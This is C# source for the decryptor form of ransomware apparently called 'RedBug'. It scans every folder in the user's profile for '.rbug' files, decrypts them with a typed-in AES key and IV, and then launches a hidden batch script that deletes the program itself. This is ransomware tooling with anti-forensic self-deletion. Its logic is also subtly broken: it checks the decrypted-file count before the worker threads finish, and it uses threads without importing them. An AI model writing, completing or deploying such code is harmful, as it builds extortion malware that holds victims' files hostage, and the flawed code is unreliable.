using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security.Cryptography;
using System.IO;
using System.Runtime.CompilerServices;
using System.Diagnostics;

namespace RedBug
{
    public partial class Decryption : Form
    {
        public static int count_ = 0;

        public Decryption()
        {
            InitializeComponent();
            panel2.MouseDown += DragForm;

        }

        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HTCAPTION = 0x2;

        [DllImport("user32.dll")]
        public static extern bool ReleaseCapture();
        [DllImport("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

        private void DragForm(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(this.Handle, WM_NCLBUTTONDOWN, HTCAPTION, 0);
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            this.ActiveControl = null;
            if (textBox1.Text == null || textBox2.Text == null) {
                MessageBox.Show("Key cannot be Empty!", "INFO");
                this.Close();
            }
            if (textBox1.Text.Length < 16 || textBox1.Text.Length > 16 || textBox2.Text.Length < 16 || textBox2.Text.Length > 16) {
                MessageBox.Show("Key is Incorret!", "INFO");
                this.Close();
            }
            if (textBox1.Text.Length == 16 && textBox2.Text.Length == 16)
            {
                StartDecrypt(textBox1.Text, textBox2.Text);
                this.Close();

            }
        }

        static void StartDecrypt(string key, string iv)
        {
            List<string> direc = new List<string>();
            List<string> files = new List<string>();
            var dirs = Directory.GetDirectories(@"C:\Users\" + Environment.UserName + @"\", "*", SearchOption.AllDirectories);
            foreach (var dir in dirs)
            {
                direc.Add(dir);
            }

            foreach (var dir in direc)
            {
                var fs = Directory.GetFiles(dir, "*", SearchOption.AllDirectories);
                foreach (var f in fs)
                {
                    files.Add(f);
                }

            }

            foreach (var f in files)
            {
                var ext = Path.GetExtension(f);

                if (ext == ".rbug")
                {

                    new Thread(() => { Dec(f, key, iv); }).Start();
                    
                }
            }

            if (count_ == 0)
            {

            }
            else if (count_ > 0)
            {
                string currentPath = AppDomain.CurrentDomain.BaseDirectory;
                string exePath = Process.GetCurrentProcess().MainModule.FileName;
                string batPath = Path.Combine(currentPath, "selfdestruct.bat");

                string batContent = $@"
                                :loop
                                del ""{exePath}""
                                if exist ""{exePath}"" goto loop
                                del ""{batPath}""
                                ";
                File.WriteAllText(batPath, batContent);

                Process.Start(new ProcessStartInfo
                {
                    FileName = batPath,
                    CreateNoWindow = true,
                    UseShellExecute = false
                });

                Environment.Exit(0);

            }

        }


        private static void Dec(string path, string key, string iv)
        {
            try
            {

                var key_ = Encoding.UTF8.GetBytes(key);
                var iv_ = Encoding.UTF8.GetBytes(iv);


                List<byte> data = new List<byte>();

                var fs = File.ReadAllBytes(path);
                foreach (byte b in fs)
                {
                    data.Add(b);
                }

                var en_ = new RijndaelManaged();
                var encr = en_.CreateDecryptor(key_, iv_);
                var stream = new FileStream(path, FileMode.Open, FileAccess.Write);
                var cryptow = new CryptoStream(stream, encr, CryptoStreamMode.Write);

                foreach (byte b in data)
                {
                    cryptow.WriteByte(b);
                }
                stream.Close();

                string result = Path.ChangeExtension(path, null);


                using (FileStream source = new FileStream(path, FileMode.Open, FileAccess.Read))
                using (FileStream dest = new FileStream(result, FileMode.Create, FileAccess.Write))
                {
                    source.CopyTo(dest);
                }

                File.Delete(path);
                count_ += 1;

            }
            catch {  }
        }
    }
}
